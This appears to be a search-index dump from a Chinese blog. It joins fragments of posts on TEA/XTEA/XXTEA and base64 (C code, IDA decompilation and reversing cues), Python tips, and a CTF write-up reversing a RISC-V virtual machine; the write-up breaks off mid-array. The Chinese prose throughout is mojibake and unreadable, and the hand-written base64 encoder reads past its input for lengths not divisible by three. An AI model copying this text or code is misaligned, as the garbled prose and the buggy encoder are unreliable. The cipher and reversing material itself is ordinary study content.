ç¬¦å·æ•´å‹ä¸Šï¼ˆå¯èƒ½æºäºä¸€ä¸ª64ä½æ•°æ®ï¼‰ TEAä½¿ç”¨ä¸€ä¸ª128ä½å¯†é’¥ ","date":"2022-07-29","objectID":"/2022/07/tea/:2:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆäºŒï¼‰TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"ç®—æ³•è¿‡ç¨‹ ","date":"2022-07-29","objectID":"/2022/07/tea/:3:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆäºŒï¼‰TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"- TEAéµå¾ªFeistelç½‘ç»œ Feistelç½‘ç»œæ„é€ ç»†èŠ‚ï¼š ä»¤Fä¸ºè½®å‡½æ•°ï¼Œå¹¶ä»¤$K_0,K_1,â€¦â€¦K_n$åˆ†åˆ«ä¸º0,1,â€¦â€¦nçš„å­å¯†é’¥ å°†æ˜æ–‡æ‹†åˆ†ä¸ºä¸¤ä¸ªç­‰é•¿çš„å—ï¼Œ$(L_0,R_0)$ å¯¹æ¯è½®$i=0,1â€¦â€¦n$ï¼Œè®¡ç®— $L_{i+1}=R_i$ $R_{i+1}=L_i \\bigoplus F(R_i,K_i)$ åˆ™å¯†æ–‡ä¸º$(R_{n+1},L_{n+1})$ åŠ è§£å¯†è¿‡ç¨‹å”¯ä¸€åŒºåˆ«æ˜¯å­å¯†é’¥é¡ºåºåè½¬ ","date":"2022-07-29","objectID":"/2022/07/tea/:3:1","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆäºŒï¼‰TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"- TEAå®ç°è¿‡ç¨‹ ","date":"2022-07-29","objectID":"/2022/07/tea/:3:2","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆäºŒï¼‰TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"Cè¯­è¨€å®ç° #include \u003cstdint.h\u003e void encrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i \u003c 32; i++) { /* basic cycle start */ sum += delta; v0 += ((v1\u003c\u003c4) + k0) ^ (v1 + sum) ^ ((v1\u003e\u003e5) + k1); v1 += ((v0\u003c\u003c4) + k2) ^ (v0 + sum) ^ ((v0\u003e\u003e5) + k3); } /* end cycle */ v[0]=v0; v[1]=v1; } void decrypt (uint32_t* v, uint32_t* k) { uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i; /* set up */ uint32_t delta=0x9e3779b9; /* a key schedule constant */ uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; /* cache key */ for (i=0; i\u003c32; i++) { /* basic cycle start */ v1 -= ((v0\u003c\u003c4) + k2) ^ (v0 + sum) ^ ((v0\u003e\u003e5) + k3); v0 -= ((v1\u003c\u003c4) + k0) ^ (v1 + sum) ^ ((v1\u003e\u003e5) + k1); sum -= delta; } /* end cycle */ v[0]=v0; v[1]=v1; } ","date":"2022-07-29","objectID":"/2022/07/tea/:4:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆäºŒï¼‰TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"é€†å‘ç®—æ³•ç‰¹å¾ deltaçš„å€¼0x9e3779b9ï¼Œä¸”æœ‰sumåœ¨æ¯ä¸€è½®é€æ¬¡ç´¯åŠ ï¼Œä½†deltaæ•°å€¼å®¹æ˜“è¢«é­”æ”¹ åŠ å¯†è½®æ¬¡ä¸€èˆ¬ä¸º32è½®ï¼Œä¸”æ¯è½®åŠ å¯†éƒ½æ˜¯å¯¹ä¸¤ä¸ª32ä½æ•°æ®è¿›è¡Œ \u003c\u003c4ä¸\u003e\u003e5åŠå…¶åŠ å¯†é€»è¾‘ä¸€èˆ¬æ˜¯æœ€é‡è¦çš„çªç ´å£ ","date":"2022-07-29","objectID":"/2022/07/tea/:5:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆäºŒï¼‰TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"XTEA #include \u003cstdint.h\u003e /* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */ void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i \u003c num_rounds; i++) { v0 += (((v1 \u003c\u003c 4) ^ (v1 \u003e\u003e 5)) + v1) ^ (sum + key[sum \u0026 3]); sum += delta; v1 += (((v0 \u003c\u003c 4) ^ (v0 \u003e\u003e 5)) + v0) ^ (sum + key[(sum\u003e\u003e11) \u0026 3]); } v[0]=v0; v[1]=v1; } void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i \u003c num_rounds; i++) { v1 -= (((v0 \u003c\u003c 4) ^ (v0 \u003e\u003e 5)) + v0) ^ (sum + key[(sum\u003e\u003e11) \u0026 3]); sum -= delta; v0 -= (((v1 \u003c\u003c 4) ^ (v1 \u003e\u003e 5)) + v1) ^ (sum + key[sum \u0026 3]); } v[0]=v0; v[1]=v1; } ","date":"2022-07-29","objectID":"/2022/07/tea/:6:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆäºŒï¼‰TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"XXTEA #define MX ((z\u003e\u003e5^y\u003c\u003c2) + (y\u003e\u003e3^z\u003c\u003c4) ^ (sum^y) + (k[p\u00263^e]^z)) long btea(long* v, long n, long* k) { unsigned long z=v[n-1], y=v[0], sum=0, e, DELTA=0x9e3779b9; long p, q ; if (n \u003e 1) { /* Coding Part */ q = 6 + 52/n; while (q-- \u003e 0) { sum += DELTA; e = (sum \u003e\u003e 2) \u0026 3; for (p=0; p\u003cn-1; p++) y = v[p+1], z = v[p] += MX; y = v[0]; z = v[n-1] += MX; } return 0 ; } else if (n \u003c -1) { /* Decoding Part */ n = -n; q = 6 + 52/n; sum = q*DELTA ; while (sum != 0) { e = (sum \u003e\u003e 2) \u0026 3; for (p=n-1; p\u003e0; p--) z = v[p-1], y = v[p] -= MX; z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } return 0; } return 1; } ","date":"2022-07-29","objectID":"/2022/07/tea/:7:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆäºŒï¼‰TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"base64ç¼–ç  ","date":"2022-07-10","objectID":"/2022/07/base64/:0:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸€ï¼‰base64ç¼–ç ","uri":"/2022/07/base64/"},{"categories":["Crypto"],"content":"ç¼–ç åŸç† Base64æ˜¯ä¸€ç§åŸºäº64ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®çš„è¡¨ç¤ºæ–¹æ³• ç”±äº$\\log_{2}{64}=6$ï¼Œæ‰€ä»¥æ¯6ä¸ªæ¯”ç‰¹ä¸ºä¸€ä¸ªå•å…ƒï¼Œå¯¹åº”ä¸€ä¸ªå¯æ‰“å°å­—ç¬¦ã€‚3ä¸ªå­—èŠ‚å³24ä¸ªæ¯”ç‰¹ï¼Œå¯¹åº”4ä¸ªBase64å•å…ƒï¼Œæ•…4ä¸ªå¯æ‰“å°å­—ç¬¦è¡¨ç¤º3ä¸ªå­—èŠ‚çš„ä¿¡æ¯ å¦‚æœè¢«ç¼–ç çš„å­—èŠ‚æ•°ä¸èƒ½è¢«3æ•´é™¤ï¼ˆå¤šå‡º1ä¸ªæˆ–2ä¸ªå­—èŠ‚ï¼‰ï¼Œé‚£ä¹ˆå…ˆåœ¨æœ«å°¾è¡¥1ä¸ªæˆ–2ä¸ªå­—èŠ‚çš„0å€¼ï¼Œä½¿å…¶èƒ½å¤Ÿè¢«3æ•´é™¤ã€‚ç„¶åè¿›è¡Œbase64ç¼–ç ï¼Œæœ«å°¾æ¯æœ‰6æ¯”ç‰¹0å€¼å°±åœ¨base64ç¼–ç æ–‡æœ¬ååŠ æœ‰ä¸€ä¸ªâ€˜â€™=â€˜â€™å· ","date":"2022-07-10","objectID":"/2022/07/base64/:1:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸€ï¼‰base64ç¼–ç ","uri":"/2022/07/base64/"},{"categories":["Crypto"],"content":"ç¼–ç è¿‡ç¨‹ å®šä¹‰base64ç¼–ç å¯¹åº”è¡¨ è®¡ç®—ç¼–ç åçš„æ–‡æœ¬é•¿åº¦ 3ä¸ªå­—èŠ‚å¯¹åº”4ä¸ªBase64å•å…ƒè¿›è¡Œç¼–ç  å¦‚æœéœ€è¦åˆ™è¡¥â€˜â€™=â€˜â€˜ ","date":"2022-07-10","objectID":"/2022/07/base64/:2:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸€ï¼‰base64ç¼–ç ","uri":"/2022/07/base64/"},{"categories":["Crypto"],"content":"Cè¯­è¨€å®ç° unsigned char* base64_encode(unsigned char* str) { // 1. define the base64 table unsigned char table[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"; // 2. calculate the length of string after base64 encoding int str_len = strlen(str); int len; if (str_len % 3 == 0) { len = str_len / 3 * 4; } else { len = (str_len/3 + 1) * 4; } // 3. Encoding as a group of three 8-bit characters unsigned char *res = malloc(sizeof(unsigned char) * len + 1); res[len] = '\\0'; int i, j; for(i=0, j=0; j\u003cstr_len; j+=3, i+=4) { res[i] = table[str[j] \u003e\u003e 2]; res[i+1] = table[(str[j]\u00260b11) \u003c\u003c 4 | str[j+1] \u003e\u003e 4]; res[i+2] = table[(str[j+1]\u00260b1111) \u003c\u003c 2 | str[j+2] \u003e\u003e 6]; res[i+3] = table[str[j+2]\u00260b111111]; } // 4. add '=' if needed switch (str_len % 3) { case 1: res[len-1] = '='; res[len-2] = '='; break; case 2: res[len-1] = '='; break; } return res; } ","date":"2022-07-10","objectID":"/2022/07/base64/:3:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸€ï¼‰base64ç¼–ç ","uri":"/2022/07/base64/"},{"categories":["Crypto"],"content":"é€†å‘ç®—æ³•ç‰¹å¾ å°†äºŒè¿›åˆ¶æ–‡ä»¶æ‹–å…¥idaåˆ†æï¼Œèƒ½å¤åŸè¾ƒä¸ºæ¸…æ™°çš„ä»£ç  _BYTE *__fastcall base64_encode(const char *str) { int len; // [rsp+18h] [rbp-68h] int v3; // [rsp+1Ch] [rbp-64h] int i; // [rsp+20h] [rbp-60h] int str_len; // [rsp+24h] [rbp-5Ch] _BYTE *res; // [rsp+28h] [rbp-58h] char table[72]; // [rsp+30h] [rbp-50h] BYREF unsigned __int64 v8; // [rsp+78h] [rbp-8h] v8 = __readfsqword(0x28u); strcpy(table, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"); str_len = strlen(str); if ( str_len % 3 ) len = 4 * (str_len / 3 + 1); else len = 4 * (str_len / 3); res = malloc(len + 1LL); res[len] = 0; v3 = 0; for ( i = 0; i \u003c str_len; i += 3 ) { res[v3] = table[(unsigned __int8)str[i] \u003e\u003e 2]; res[v3 + 1] = table[((unsigned __int8)str[i + 1] \u003e\u003e 4) | (16 * str[i]) \u0026 0x30]; res[v3 + 2] = table[((unsigned __int8)str[i + 2] \u003e\u003e 6) | (4 * str[i + 1]) \u0026 0x3C]; res[v3 + 3] = table[str[i + 2] \u0026 0x3F]; v3 += 4; } if ( str_len % 3 == 1 ) { res[len - 1] = '='; res[len - 2] = '='; } else if ( str_len % 3 == 2 ) { res[len - 1] = '='; } return res; } base64ç¼–ç çš„æ˜¾è‘—ç‰¹å¾åœ¨äºç¼–ç è¡¨tableï¼Œåœ¨é€†å‘é¢˜ä¸­å¸¸è§æ¢è¡¨æˆ–åŠ¨æ€ç”Ÿæˆè¡¨ ç¼–ç è¿‡ç¨‹ä¸­çš„å¾ªç¯ç§»ä½æ“ä½œä¹Ÿæ˜¯ä¸€å¤§ç‰¹å¾ å¯¹lençš„åˆ¤æ–­ä¹Ÿå¿…ä¸å¯å°‘ï¼Œæ˜¯ä¸ªçªç ´ç‚¹ ","date":"2022-07-10","objectID":"/2022/07/base64/:4:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆä¸€ï¼‰base64ç¼–ç ","uri":"/2022/07/base64/"},{"categories":["Dev"],"content":"åŸºæœ¬è¾“å…¥è¾“å‡º ","date":"2022-06-17","objectID":"/2022/06/python-tips/:1:0","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- è¾“å…¥ python2ï¼š inputï¼šå¸Œæœ›è¯»å–ä¸€ä¸ªåˆæ³•çš„pythonè¡¨è¾¾å¼ raw_inputï¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¯»å–è¾“å…¥ python3ï¼š åªæœ‰inputï¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¯»å–è¾“å…¥ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:1:1","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- è¾“å‡º python2ï¼šprintæ˜¯ä¸€æ¡è¯­å¥ï¼Œåä¸åŠ æ‹¬å· python3ï¼šprintæ˜¯ä¸ªå‡½æ•°ï¼ŒååŠ æ‹¬å· ","date":"2022-06-17","objectID":"/2022/06/python-tips/:1:2","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"å¤åˆæ•°æ®ç»“æ„ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:2:0","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- åˆ—è¡¨ listå‡½æ•°ï¼šå°†å¯è¿­ä»£å¯¹è±¡ç±»å‹çš„æ•°æ®è½¬åŒ–ä¸ºåˆ—è¡¨ï¼Œå¦‚å…ƒç»„ã€rangeå¯¹è±¡ã€å­—ç¬¦ä¸²ç­‰ delå‡½æ•°ï¼šåˆ é™¤åˆ—è¡¨ç‰¹å®šå€¼ï¼ˆä¸‹æ ‡ç´¢å¼•ï¼‰æˆ–åˆ é™¤æ•´ä¸ªåˆ—è¡¨ï¼Œè‹¥åˆ—è¡¨å¯¹è±¡ä¸å†æœ‰å…¶ä»–å¯¹è±¡æŒ‡å‘ï¼ŒpythonåŒæ—¶åˆ é™¤è¯¥åˆ—è¡¨å¯¹è±¡ ä½¿ç”¨+å‘åˆ—è¡¨ä¸­æ·»åŠ å…ƒç´ ä¼šç”Ÿæˆæ–°çš„åˆ—è¡¨ï¼Œå°†å…ƒç´ é€ä¸€èµ‹å€¼è¿‡å»ï¼Œæ•ˆç‡è¾ƒä½ appendå‡½æ•°åŸåœ°ä¿®æ”¹ï¼Œæ•ˆç‡è¾ƒé«˜ extendå‡½æ•°å°†å¦ä¸€ä¸ªè¿­ä»£å¯¹è±¡çš„æ‰€æœ‰å…ƒç´ æ·»åŠ è‡³è¯¥åˆ—è¡¨çš„å°¾éƒ¨ï¼Œï¼Œä¸æ”¹å˜å…¶å†…å­˜é¦–åœ°å€ï¼Œå±äºåŸåœ°æ“ä½œ popå‡½æ•°åˆ é™¤å¹¶è¿”å›æŒ‡å®šå…ƒç´ ï¼ˆä¸æä¾›ä¸‹æ ‡åˆ™é»˜è®¤æœ€åä¸€ä¸ªï¼‰ removeå‡½æ•°åˆ é™¤é¦–æ¬¡å‡ºç°çš„æŒ‡å®šå…ƒç´ ï¼Œæ— è¿”å›å€¼ shallow copyï¼šæ‹·è´å¤–å±‚å¯¹è±¡ï¼Œä½†å†…å±‚å¯¹è±¡è¿˜æ˜¯æŒ‡å‘ç›¸åŒå¯¹è±¡ï¼Œåˆ‡ç‰‡æ˜¯shallow copy deep copyï¼šå®Œå…¨æ‹·è´äº†å¯¹è±¡åŠå…¶å­å¯¹è±¡ åˆ—è¡¨å¯¹è±¡çš„sortæ–¹æ³•åŸåœ°æ’åºï¼Œå†…ç½®å‡½æ•°sortedè¿”å›æ–°åˆ—è¡¨ï¼Œä¸æ”¹å˜åŸåˆ—è¡¨ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:2:1","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- å…ƒç»„ åˆ›å»ºåªæœ‰ä¸€ä¸ªå…ƒç´ çš„å…ƒç»„å¿…é¡»åœ¨å…ƒç´ ååŠ é€—å· delå‡½æ•°åªèƒ½åˆ é™¤æ•´ä¸ªå…ƒç´ ï¼Œå› ä¸ºå…ƒç»„æ˜¯ä¸å¯å˜åºåˆ— ä½¿ç”¨åºåˆ—è§£åŒ…åŠŸèƒ½ä¸ºå¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:2:2","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- å­—å…¸ å­—å…¸ä¹Ÿå¯ä»¥åºåˆ—è§£åŒ… ä½¿ç”¨ dict() å‡½æ•°åˆ©ç”¨å·²æœ‰æ•°æ®åˆ›å»ºå­—å…¸ getæ–¹æ³•ï¼šè·å–æŒ‡å®šé”®å¯¹åº”çš„å€¼ï¼Œè‹¥ä¸å­˜åœ¨ï¼Œè¿”å›æŒ‡å®šå€¼ï¼ˆè‹¥æœªæŒ‡å®šåˆ™é»˜è®¤è¿”å›noneï¼‰ updateæ–¹æ³•ï¼šå‘å­—å…¸ä¸­æ·»åŠ é”®å€¼å¯¹ï¼Œå¯ä½¿ç”¨=ã€å­—å…¸ã€å…ƒç»„ï¼ˆæ³¨æ„ä¸€ä¸ªå…ƒç´ æ—¶çš„é€—å·ï¼‰ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:2:3","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- é›†åˆ é›†åˆçš„äº¤é›†ã€å¹¶é›†ã€å·®é›†ç­‰è¿ç®— ","date":"2022-06-17","objectID":"/2022/06/python-tips/:2:4","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"é€‰æ‹©ä¸å¾ªç¯ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:3:0","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- é€‰æ‹© ==ä¸isï¼š==æµ‹è¯•å€¼çš„ç›¸ç­‰æ€§ï¼Œé€’å½’åœ°æ¯”è¾ƒæ‰€æœ‰å†…åµŒå¯¹è±¡ï¼Œisæµ‹è¯•äºŒè€…æ˜¯å¦æ˜¯åŒä¸€å¯¹è±¡ï¼ˆæ˜¯å¦åœ¨åŒä¸€å†…å­˜åœ°å€ä¸­ï¼‰ ç¼“å­˜å¤ç”¨ï¼šå¯¹è±¡æ˜¯å°çš„æ•´æ•°æˆ–å­—ç¬¦ä¸²æ—¶ï¼Œå¤šä¸ªå˜é‡å¯èƒ½æŒ‡å‘åŒä¸€å¯¹è±¡ä»¥æé«˜æ€§èƒ½ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:3:1","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- å¾ªç¯ whileå’Œforå¾ªç¯å¯ä»¥å¸¦elseå—ï¼Œå¦‚æœå› å¾ªç¯è¡¨è¾¾å¼ä¸æˆç«‹è€Œç»“æŸå¾ªç¯ï¼ˆä¸æ˜¯breakç»“æŸå¾ªç¯ï¼‰ï¼Œåˆ™æ‰§è¡Œelseä¸­çš„å†…å®¹ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:3:2","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"å‡½æ•° ","date":"2022-06-17","objectID":"/2022/06/python-tips/:4:0","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- å¯å˜é•¿åº¦å‚æ•° *parameterï¼šæ¥å—å¤šä¸ªå½¢å‚å¹¶å°†å…¶æ”¾åœ¨ä¸€ä¸ªå…ƒç»„ä¸­ **parameterï¼šç”¨æ¥æ¥å—å­—å…¸å½¢å¼çš„å®å‚ï¼ˆå¯ä½¿ç”¨**å­—å…¸è§£åŒ…ä»£æ›¿ï¼‰ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:4:1","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- å‡½æ•°è°ƒç”¨æ—¶å‚æ•°è§£åŒ… ä½¿ç”¨åˆ—è¡¨ã€å…ƒç»„ç­‰å¯è¿­ä»£å¯¹è±¡ä½œä¸ºå®å‚ï¼Œå¹¶åœ¨å‰é¢åŠ ä¸€ä¸ªåˆ†å· ä½¿ç”¨å­—å…¸ä¼ å‚ï¼Œé»˜è®¤ä½¿ç”¨å­—å…¸çš„é”® è¦ä¿è¯å®å‚å½¢å‚ä¸ªæ•°ç›¸åŒ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:4:2","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- lambdaå‡½æ•° mapå‡½æ•°ï¼šå°†å‡½æ•°ä½œç”¨çš„ä¸€ä¸ªåºåˆ—æˆ–è¿­ä»£å™¨çš„æ¯ä¸€ä¸ªå…ƒç´ ä¸Š reduceå‡½æ•°ï¼šå°†ä¸€ä¸ªæ¥å—ä¸¤ä¸ªå‚æ•°çš„å‡½æ•°ä»¥ç´¯ç§¯çš„æ–¹å¼ä»å·¦åˆ°å³ä¸€æ¬¡ä½œç”¨åˆ°ä¸€ä¸ªåºåˆ—æˆ–è¿­ä»£å™¨çš„æ¯ä¸€ä¸ªå…ƒç´ ä¸Š python3éœ€è¦from functools import reduce filterå‡½æ•°ï¼šå°†ä¸€ä¸ªå‡½æ•°ä½œç”¨åˆ°ä¸€ä¸ªåºåˆ—ä¸Šï¼Œè¿”å›åºåˆ—ä¸­ä½¿è¯¥å‡½æ•°è¿”å›å€¼ä¸ºTrueçš„å…ƒç´ ç»„æˆçš„åºåˆ— ","date":"2022-06-17","objectID":"/2022/06/python-tips/:4:3","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- è¿­ä»£ æ–‡ä»¶è¿­ä»£å™¨ iterå‡½æ•°ï¼šæ ¹æ®å¯è¿­ä»£å¯¹è±¡æ„é€ æˆè¿­ä»£å™¨ï¼Œå¯¹åº”å¯è¿­ä»£å¯¹è±¡çš„__iter__æ–¹æ³• nextå‡½æ•°ï¼šè¿­ä»£å™¨çš„ä¸‹ä¸€é¡¹ï¼Œå¯¹åº”å¯è¿­ä»£å¯¹è±¡çš„__next__æ–¹æ³• ","date":"2022-06-17","objectID":"/2022/06/python-tips/:4:4","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- ç”Ÿæˆå™¨ ç”Ÿæˆå™¨å‡½æ•°ï¼ˆè¿”å›è¿­ä»£å™¨ï¼‰ ç”Ÿæˆå™¨è¡¨è¾¾å¼ï¼ˆè¿”å›è¿­ä»£å™¨ï¼‰ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:4:5","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"ç±» ","date":"2022-06-17","objectID":"/2022/06/python-tips/:5:0","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- ç±»çš„__str__å’Œ__repr__æ–¹æ³• éƒ½æ˜¯è¿”å›å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤º __str__ï¼šprintå‡½æ•°ä¼˜å…ˆä½¿ç”¨__str__ï¼Œè‹¥åªé‡è½½äº†__repr__ï¼Œåˆ™ä½¿ç”¨__repr__ __repr__ï¼šé™¤printå‡½æ•°ä»¥å¤–æ‰€æœ‰åœ°æ–¹ä¼˜å…ˆä½¿ç”¨__repr__ ","date":"2022-06-17","objectID":"/2022/06/python-tips/:5:1","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- å†…çœ å†…çœï¼ˆintrospectionï¼‰æ˜¯æŒ‡è®¡ç®—æœºç¨‹åºåœ¨è¿è¡Œæ—¶ï¼ˆrun timeï¼‰æ£€æŸ¥å¯¹è±¡ï¼ˆobjectï¼‰ç±»å‹çš„ä¸€ç§èƒ½åŠ›ï¼Œä¹Ÿç§°ä½œè¿è¡Œæ—¶ç±»å‹æ£€æŸ¥ï¼ˆrun-time type checkingï¼‰ instance.__class__ å’Œ instance.__dict__æ–¹æ³• è‡ªå®šä¹‰é€šç”¨æ˜¾ç¤ºå·¥å…·ç±» ","date":"2022-06-17","objectID":"/2022/06/python-tips/:5:2","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- è£…é¥°å™¨ ç”±@ç¬¦å·å¼€å¤´ï¼Œåé¢è·Ÿç€æ‰€è°“çš„å…ƒå‡½æ•°ï¼ˆmetafunctionï¼‰ç»„æˆï¼Œä¸€ä¸ªå‡½æ•°åŠ å·¥å¦ä¸€ä¸ªå‡½æ•° ","date":"2022-06-17","objectID":"/2022/06/python-tips/:5:3","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["Dev"],"content":"- ç±»çš„ä¼ªç§æœ‰å±æ€§ classå®šä¹‰ä»£ç å—å†…ï¼Œå¼€å¤´æœ‰ä¸¤ä¸ªä¸‹åˆ’çº¿ï¼Œä½†ç»“å°¾æ²¡æœ‰ä¸¤ä¸ªä¸‹åˆ’çº¿çš„å˜é‡åï¼Œä¼šè‡ªåŠ¨æ‰©å±•ï¼Œä»è€ŒåŒ…å«å®ƒæ‰€åœ¨ç±»çš„åç§° ä¾‹å¦‚ï¼ŒSpamç±»å†… __x è¿™æ ·çš„å˜é‡åä¼šè‡ªåŠ¨å˜æˆ _Spam__x ","date":"2022-06-17","objectID":"/2022/06/python-tips/:5:4","tags":["python"],"title":"Python tips","uri":"/2022/06/python-tips/"},{"categories":["WriteUps"],"content":"not RC4 RISC-V é€†å‘ï¼Œæœ‰æ‰¾åˆ°idaçš„æ’ä»¶ï¼Œä½†è£…ä¸Šä¸€ç›´æŠ¥é”™ï¼Œæ”¾å¼ƒ åˆæ‰¾åˆ°Ghidraï¼Œåç¼–è¯‘å¾ˆä¸‘ä½†èƒ½ç”¨ï¼Œä½¿åŠ²çœ‹å‘ç°æ˜¯ä¸ªvm å¤§è‡´æµç¨‹åŠæŒ‡ä»¤ 0 0xf1 6 LAB_00100b7e 8 { int i; for (i = 0; i \u003c 4; i ++) { if (\u0026enc_flag[i]) != check_array[i]) { //longlong printf(\"Wrong!\"); exit(0); } } op_pointer++; return; } 0xf2 10 LAB_00100bfe 12 { if (key_num_2 \u003c opcode[op_pointer + 2]) {//0x0b op_pointer -= opcode[op_pointer + 1];//4 key_num_2 ++; } else { key_num_2 = 0; op_pointer += 3; } return; } 0xf3 14 LAB_00100974 16 key_const_1 = 0x0000000064627421; key_const_2 = 0x0000000079796473; { left_8_bytes = input_left_8_bytes + key_const_1; right_8_bytes = input_right_8_bytes + key_const_2; op_pointer += 2; return; } 0xf4 18 LAB_00100a10 20 { if (opcode[op_pointer + 1] == 0xe1) { left_8_bytes = key_const_1 + ((right_8_bytes ^ left_8_bytes) \u003e\u003e (-right_8_bytes \u0026 0x3f) | (right_8_bytes ^ left_8_bytes) \u003c\u003c (right_8_bytes \u0026 0x3fU)); left_8_bytes = key_const_1 + rol(right_8_bytes ^ left_8_bytes, 6); } if (opcode[*op_pointer + 1] == 0xe2) { right_8_bytes = key_const_2 + ((right_8_bytes ^ left_8_bytes) \u003e\u003e (-left_8_bytes \u0026 0x3f) | (right_8_bytes ^ left_8_bytes) \u003c\u003c (left_8_bytes \u0026 0x3f)); } op_pointer += 2; return; } void RC5_ENCRYPT(WORD *pt, WORD *ct) { WORD i, A = pt[0] + S[0], B = pt[1] + S[1]; for(i = 1; i \u003c= r; i++) { A = ROTL(A ^ B, B) + S[2*i]; B = ROTL(B ^ A, A) + S[2*i + 1]; } ct[0] = A; ct[1] = B; } (val \u003c\u003c r_bits%max_bits) \u0026 (2**max_bits-1) | \\ ((val \u0026 (2**max_bits-1)) \u003e\u003e (max_bits-(r_bits%max_bits))) 0xf5 22 LAB_00100af0 24 { *(undefined8 *)(\u0026check_array + (longlong)key_num_1 * 8) = left_8_bytes; *(undefined8 *)(\u0026check_array + (longlong)(key_num_1 + 1) * 8) = right_8_bytes; left_8_bytes = 0; right_8_bytes = 0; key_num_1 += 2; op_pointer++; return; } opcode = { 0xf3, 0x00, 0xf4, 0xe1, 0xf4, 0xe2, 0xf2, 0x04, 0x0b, 0xf5, 0xf3, 0x02, 0xf4, 0xe1, 0xf4, 0xe2, 0xf2, 0x04, 0x0b, 0xf5, 0xf1, 0xff } enc_flag = { 0xca, 0x82, 0xef, 0x95, 0xbb, 0x1d, 0xc2, 0x4b, 0xbe, 0x47, 0xb5, 0x71, 0xae, 0xec, 0x7b, 0xf5, 0xcd, 